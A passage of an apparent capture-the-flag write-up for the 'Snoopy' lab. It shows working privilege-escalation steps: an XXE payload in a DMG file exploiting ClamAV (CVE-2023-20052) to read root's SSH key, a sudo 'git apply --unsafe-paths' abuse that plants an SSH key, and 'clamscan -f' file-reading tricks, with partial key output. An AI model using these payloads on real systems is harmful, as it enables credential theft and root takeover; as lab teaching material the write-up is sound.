+<p>I’ll scan it using the syntax allowed by <code class="language-plaintext highlighter-rouge">sudo</code>. This generates a ton of output. I’ll search around in it, looking for the “dmg” parser, and find this:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sbrown@snoopy:~/scanfiles$</span><span class="w"> </span><span class="nb">sudo </span>clamscan <span class="nt">--debug</span> /home/sbrown/scanfiles/notepad.dmg 
+<span class="go">...[snip]...
+LibClamAV debug: cli_scandmg: Matched blkx
+LibClamAV debug: dmg_decode_mish: startSector = 0 sectorCount = 1 dataOffset = 0 stripeCount = 2
+LibClamAV debug: dmg_decode_mish: startSector = 1 sectorCount = 63 dataOffset = 0 stripeCount = 2        
+LibClamAV debug: dmg_decode_mish: startSector = 64 sectorCount = 105184 dataOffset = 0 stripeCount = 168 
+LibClamAV debug: dmg_decode_mish: startSector = 105248 sectorCount = 2 dataOffset = 0 stripeCount = 2    
+LibClamAV debug: cli_scandmg: wanted blkx, text value is plst
+...[snip]...
+</span></code></pre></div></div>
+<p>These stand out because they are from the <code class="language-plaintext highlighter-rouge">cli_scandmg</code> module. The first one says “Matched blkx”, which was one of the two fields I noted in the XML. The last one says “wanted lbkx, text value is plst”. It’s not immediately clear to me what this means, but I am getting the value of a key!</p>
+<h4 id="modify-dmg">Modify DMG</h4>
+<p>I’ll copy the file to <code class="language-plaintext highlighter-rouge">notepadxxe.dmg</code>, and open it in a hexeditor (like <code class="language-plaintext highlighter-rouge">ghex</code>). This XML starts like:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="cp">&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;</span>
+</code></pre></div></div>
+<p>An <a href="https://github.com/payloadbox/xxe-injection-payload-list#xxe-file-disclosure">XXE POC for file disclosure</a> looks like this:</p>
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">&lt;!--?xml version="1.0" ?--&gt;</span>
+<span class="cp">&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM "file:///etc/shadow"&gt;</span> ]&gt;
+<span class="nt">&lt;userInfo&gt;</span>
+ <span class="nt">&lt;firstName&gt;</span>John<span class="nt">&lt;/firstName&gt;</span>
+ <span class="nt">&lt;lastName&gt;</span><span class="ni">&amp;ent;</span><span class="nt">&lt;/lastName&gt;</span>
+<span class="nt">&lt;/userInfo&gt;</span>
+</code></pre></div></div>
+<p>I’ll edit the <code class="language-plaintext highlighter-rouge">DOCTYPE</code> in the DMG to create an entity that references <code class="language-plaintext highlighter-rouge">/root/.ssh/id_rsa</code>:</p>
+<picture>
+<source srcset="/img/image-20230510172620920.webp" type="image/webp"/>
+<img alt="image-20230510172620920" class="include_image" loading="lazy" src="/img/image-20230510172620920.png"/>
+</picture>
+<p>I’ve used spaces to pad out the extra stuff. I am using a variable <code class="language-plaintext highlighter-rouge">df</code> such that when I reference it later as <code class="language-plaintext highlighter-rouge">&amp;df;</code>, it takes four characters, the same length as <code class="language-plaintext highlighter-rouge">plst</code>. Down the file a bit, I’ll find the <code class="language-plaintext highlighter-rouge">plst</code> key and modify it:</p>
+<picture>
+<source srcset="/img/image-20230510170430588.webp" type="image/webp"/>
+<img alt="image-20230510170430588" class="include_image" loading="lazy" src="/img/image-20230510170430588.png"/>
+</picture>
+<h4 id="exploit">Exploit</h4>
+<p>I’ll upload this file again, and run it just like before. Where before it said “text value is plst”, now it has the private key:</p>
+<picture>
+<source srcset="/img/image-20230510172335764.webp" type="image/webp"/>
+<img alt="image-20230510172335764" class="include_image" loading="lazy" src="/img/image-20230510172335764.png"/>
+</picture>
+<h3 id="public-exploit">Public Exploit</h3>
+<p>Not long after the release of Snoopy, nokn0wthing put out <a href="https://github.com/nokn0wthing/CVE-2023-20052">this repo</a>. It has a Docker container that will generate the DMG file for me.</p>
+<p>Following the instructions in the repo, I’ll clone it and build the container:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>git clone https://github.com/nokn0wthing/CVE-2023-20052.git
+<span class="go">Cloning into 'CVE-2023-20052'...
+remote: Enumerating objects: 15, done.
+remote: Counting objects: 100% (15/15), done.
+remote: Compressing objects: 100% (14/14), done.
+remote: Total 15 (delta 4), reused 4 (delta 0), pack-reused 0
+Receiving objects: 100% (15/15), 47.69 KiB | 2.17 MiB/s, done.
+Resolving deltas: 100% (4/4), done.
+</span><span class="gp">oxdf@hacky$</span><span class="w"> </span><span class="nb">cd </span>CVE-2023-20052/
+<span class="gp">oxdf@hacky$</span><span class="w"> </span>docker build <span class="nt">-t</span> cve-2023-20052 <span class="nb">.</span>
+<span class="go">...[snip]...
+</span></code></pre></div></div>
+<p>I’ll drop into the container, mounting the current directory in as the <code class="language-plaintext highlighter-rouge">/exploit</code> directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>docker run <span class="nt">-v</span> <span class="si">$(</span><span class="nb">pwd</span><span class="si">)</span>:/exploit <span class="nt">-it</span> cve-2023-20052 bash
+<span class="go">root@c1cff2f4ad04:/exploit# 
+</span></code></pre></div></div>
+<p>The first step is to generate an ISO image. There’s one in <code class="language-plaintext highlighter-rouge">/exploit</code>, but I’ll delete it for the sake of demo:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@39e742dc1260:/exploit#</span><span class="w"> </span><span class="nb">rm </span>test.img 
+<span class="gp">root@39e742dc1260:/exploit#</span><span class="w"> </span>genisoimage <span class="nt">-D</span> <span class="nt">-V</span> <span class="s2">"exploit"</span> <span class="nt">-no-pad</span> <span class="nt">-r</span> <span class="nt">-apple</span> <span class="nt">-file-mode</span> 0777 <span class="nt">-o</span> test.img <span class="nb">.</span>
+<span class="go">genisoimage: Warning: no Apple/Unix files will be decoded/mapped
+Total translation table size: 0
+Total rockridge attributes bytes: 6878
+Total directory bytes: 36864
+Path table size(bytes): 240
+Max brk space used 1b000
+181 extents written (0 MB)
+</span></code></pre></div></div>
+<p>Next I’ll turn that into a DMG:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@39e742dc1260:/exploit#</span><span class="w"> </span>dmg dmg test.img test.dmg
+<span class="go">Processing DDM...
+No DDM! Just doing one huge blkx then...
+run 0: sectors=512, left=724
+run 1: sectors=212, left=212
+Writing XML data...
+Generating UDIF metadata...
+Master checksum: ffac019f
+Writing out UDIF resource file...
+Cleaning up...
+Done
+</span></code></pre></div></div>
+<p>Finally, I’ll use <code class="language-plaintext highlighter-rouge">bbe</code> (the <a href="https://linux.die.net/man/1/bbe">binary block editor</a>) to edit in the XXE, modifying the command from GitHub to read root’s ssh key instead of <code class="language-plaintext highlighter-rouge">/etc/passwd</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@39e742dc1260:/exploit#</span><span class="w"> </span>bbe <span class="nt">-e</span> <span class="s1">'s|&lt;!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;|&lt;!DOCTYPE plist [&lt;!ENTITY xxe SYSTEM "/root/.ssh/id_rsa"&gt; ]&gt;|'</span> <span class="nt">-e</span> <span class="s1">'s/blkx/&amp;xxe\;/'</span> test.dmg <span class="nt">-o</span> exploit.dmg
+</code></pre></div></div>
+<p>I’ll exit the container and (because I was working out of the mapped directory), <code class="language-plaintext highlighter-rouge">exploit.dmg</code> is there. I’ll <code class="language-plaintext highlighter-rouge">scp</code> it to Snoopy:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>scp <span class="nt">-i</span> ~/keys/ed25519_gen exploit.dmg sbrown@snoopy.htb:/home/sbrown/scanfiles
+<span class="go">exploit.dmg                                                            100%  217KB 464.4KB/s   00:00
+</span></code></pre></div></div>
+<p>And scan it as root:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sbrown@snoopy:~$</span><span class="w"> </span><span class="nb">sudo </span>clamscan <span class="nt">--debug</span> /home/sbrown/scanfiles/exploit.dmg
+<span class="go">LibClamAV debug: searching for unrar, user-searchpath: /usr/local/lib
+LibClamAV debug: unrar support loaded from /usr/local/lib/libclamunrar_iface.so.11.0.0
+LibClamAV debug: Initialized 1.0.0 engine
+LibClamAV debug: Initializing phishcheck module
+...[snip]...
+LibClamAV debug: Descriptor[3]: Continuing after file scan resulted with: No viruses detected
+LibClamAV debug: in cli_scanscript()
+LibClamAV debug: matcher_run: performing regex matching on full map: 0+3329(3329) &gt;= 3329
+LibClamAV debug: matcher_run: performing regex matching on full map: 0+3329(3329) &gt;= 3329
+LibClamAV debug: hashtab: Freeing hashset, elements: 0, capacity: 0
+LibClamAV debug: hashtab: Freeing hashset, elements: 0, capacity: 0
+LibClamAV debug: Descriptor[3]: Continuing after file scan resulted with: No viruses detected
+LibClamAV debug: cli_magic_scan: returning 0  at line 4997
+LibClamAV debug: clean_cache_add: 0bf7a447855c6e598fe480a4a46d4988 (level 0)
+LibClamAV debug: cli_scandmg: wanted blkx, text value is -----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEA1560zU3j7mFQUs5XDGIarth/iMUF6W2ogsW0KPFN8MffExz2G9D/
+4gpYjIcyauPHSrV4fjNGM46AizDTQIoK6MyN4K8PNzYMaVnB6IMG9AVthEu11nYzoqHmBf
+...[snip]...
+</span></code></pre></div></div>
+<h3 id="ssh-2">SSH</h3>
+<p>With root’s private key, I can SSH into the box:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/snoopy-root root@10.10.11.212
+<span class="go">Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)
+...[snip]...
+</span><span class="gp">root@snoopy:~#</span><span class="w">
+</span></code></pre></div></div>
+<p>And grab <code class="language-plaintext highlighter-rouge">root.txt</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@snoopy:~#</span><span class="w"> </span><span class="nb">cat </span>root.txt
+<span class="go">ce4e994c************************
+</span></code></pre></div></div>
+<h2 id="beyond-root---unintendeds">Beyond Root - Unintendeds</h2>
+<h3 id="background-1">Background</h3>
+<p>Snoopy was patched once it came out of scoring points for the season:</p>
+<picture>
+<source srcset="/img/image-20230920222934372.webp" type="image/webp"/>
+<img alt="image-20230920222934372" class="include_image" loading="lazy" src="/img/image-20230920222934372.png"/>
+</picture>
+<p>On release, cbrown’s <code class="language-plaintext highlighter-rouge">sudo</code> looked like:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cbrown@snoopy:/var/www/html$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">Matching Defaults entries for cbrown on snoopy:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User cbrown may run the following commands on snoopy:
+    (sbrown) PASSWD: /usr/bin/git apply *
+</span></code></pre></div></div>
+<p>and sbrown’s <code class="language-plaintext highlighter-rouge">sudo</code> looked like:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sbrown@snoopy:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="go">Matching Defaults entries for sbrown on snoopy:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User sbrown may run the following commands on snoopy:
+    (root) NOPASSWD: /usr/local/bin/clamscan
+</span></code></pre></div></div>
+<p>Each of these allowed for an unintended solution, and each was tighted up with regex to block the unintended paths.</p>
+<h3 id="cbrown--sbrown-unsafe-paths">cbrown –&gt; sbrown: –unsafe-paths</h3>
+<p>The main point of the exploit to showcase is that symbolic links created in the diff are not protected. However, it is possible to not even need that if I can give any parameters to <code class="language-plaintext highlighter-rouge">git apply</code> as was the case on release.</p>
+<p>For example, I’ll create a diff file in <code class="language-plaintext highlighter-rouge">/dev/shm</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cbrown@snoopy:~$</span><span class="w"> </span><span class="nb">cat</span> /dev/shm/test.diff 
+<span class="go">diff --git a/authorized_keys b/authorized_keys
+new file mode 100644
+index 0000000..ec273c0
+</span><span class="diff-removed">--- /dev/null
+</span><span class="diff-added">+++ b/authorized_keys
+</span><span class="diff-lines">@@ -0,0 +1 @@
+</span><span class="diff-added">+ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDIK/xSi58QvP1UqH+nBwpD1WQ7IaxiVdTpsg5U19G3d nobody@nothing
+</span><span class="diff-removed">-- 
+</span></code></pre></div></div>
+<p>Now I can use <code class="language-plaintext highlighter-rouge">--unsafe-paths</code> and <code class="language-plaintext highlighter-rouge">--directory</code> to apply this diff itno the <code class="language-plaintext highlighter-rouge">.ssh</code> folder of sbrown:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">cbrown@snoopy:~$</span><span class="w"> </span><span class="nb">sudo</span> <span class="nt">-u</span> sbrown git apply <span class="nt">-v</span> <span class="nt">--unsafe-paths</span> <span class="nt">--directory</span> <span class="s2">"/home/sbrown/.ssh"</span> /dev/shm/test.diff 
+<span class="go">Checking patch /home/sbrown/.ssh/authorized_keys...
+Applied patch /home/sbrown/.ssh/authorized_keys cleanly.
+</span></code></pre></div></div>
+<p>And SSH in as sbrown:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">oxdf@hacky$</span><span class="w"> </span>ssh <span class="nt">-i</span> ~/keys/ed25519_gen sbrown@snoopy.htb
+<span class="go">Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-71-generic x86_64)
+...[snip]...
+</span><span class="gp">sbrown@snoopy:~$</span><span class="w"> 
+</span></code></pre></div></div>
+<h3 id="sbrown--root-file-list---f">sbrown –&gt; root: –file-list / -f</h3>
+<p>Looking through the <code class="language-plaintext highlighter-rouge">-h</code> options for <code class="language-plaintext highlighter-rouge">clamscan</code>, <code class="language-plaintext highlighter-rouge">-f</code> jumps out as interesting.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sbrown@snoopy:~$</span><span class="w"> </span>clamscan <span class="nt">-h</span>
+<span class="go">
+                       Clam AntiVirus: Scanner 1.0.0
+           By The ClamAV Team: https://www.clamav.net/about.html#credits
+           (C) 2022 Cisco Systems, Inc.
+
+    clamscan [options] [file/directory/-]
+...[snip]...
+    --file-list=FILE      -f FILE        Scan files from FILE
+...[snip]...  
+</span></code></pre></div></div>
+<p>With <code class="language-plaintext highlighter-rouge">--file-list</code> or <code class="language-plaintext highlighter-rouge">-f</code>, it will get a list of files to scan from a file. Whenever you have something that can read a filename from a file and interact with it, it’s worth trying it on <code class="language-plaintext highlighter-rouge">root.txt</code>.</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sbrown@snoopy:~$</span><span class="w"> </span><span class="nb">sudo </span>clamscan <span class="nt">-f</span> /root/root.txt
+<span class="go">LibClamAV Warning: **************************************************
+LibClamAV Warning: ***  The virus database is older than 7 days!  ***
+LibClamAV Warning: ***   Please update it as soon as possible.    ***
+LibClamAV Warning: **************************************************
+Loading:    25s, ETA:   0s [========================&gt;]    8.66M/8.66M sigs
+Compiling:   7s, ETA:   0s [========================&gt;]       41/41 tasks 
+
+d78ba555860aee798a837bbfb58fc0cd: No such file or directory
+WARNING: d78ba555860aee798a837bbfb58fc0cd: Can't access file
+
+----------- SCAN SUMMARY -----------
+Known viruses: 8659055
+Engine version: 1.0.0
+Scanned directories: 0
+Scanned files: 0
+Infected files: 0
+Data scanned: 0.00 MB
+Data read: 0.00 MB (ratio 0.00:1)
+Time: 33.961 sec (0 m 33 s)
+Start Date: 2023:05:10 16:43:58
+End Date:   2023:05:10 16:44:32
+</span></code></pre></div></div>
+<p>Here, it reads the hash out of <code class="language-plaintext highlighter-rouge">root.txt</code>, and then tried to read the file with named by that hash. But that hash isn’t a file, so it fails, and in the error message, prints the flag!</p>
+<p>The same trick works to read <code class="language-plaintext highlighter-rouge">/root/.ssh/id_rsa</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sbrown@snoopy:~$</span><span class="w"> </span><span class="nb">sudo </span>clamscan <span class="nt">-f</span> /root/.ssh/id_rsa
+<span class="go">...[snip]...
+-----BEGIN OPENSSH PRIVATE KEY-----: No such file or directory
+WARNING: -----BEGIN OPENSSH PRIVATE KEY-----: Can't access file
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn: No such file or directory
+WARNING: b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn: Can't access file
+NhAAAAAwEAAQAAAYEA1560zU3j7mFQUs5XDGIarth/iMUF6W2ogsW0KPFN8MffExz2G9D/: No such file or directory
+WARNING: NhAAAAAwEAAQAAAYEA1560zU3j7mFQUs5XDGIarth/iMUF6W2ogsW0KPFN8MffExz2G9D/: Can't access file
+...[snip]...
+</span></code></pre></div></div>
+<p>Some <code class="language-plaintext highlighter-rouge">bash</code> foo will print that nicely by getting just the first of the two error lines and isolating just the content:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">sbrown@snoopy:~$</span><span class="w"> </span><span class="nb">sudo </span>clamscan <span class="nt">-f</span> /root/.ssh/id_rsa 2&gt;&amp;1 | <span class="nb">grep</span> <span class="s2">"No such file"</span> | <span class="nb">cut</span> <span class="nt">-d</span><span class="s1">':'</span> <span class="nt">-f1</span>
+<span class="go">-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAYEA1560zU3j7mFQUs5XDGIarth/iMUF6W2ogsW0KPFN8MffExz2G9D/
+...[snip]...
+atU0AwHtCazK8AAAAPcm9vdEBzbm9vcHkuaHRiAQIDBA==
+-----END OPENSSH PRIVATE KEY-----
+</span></code></pre></div></div>
+</div>
+</div>
+</div><a class="u-url" hidden="" href="/2023/09/23/htb-snoopy.html"></a>
+</article>
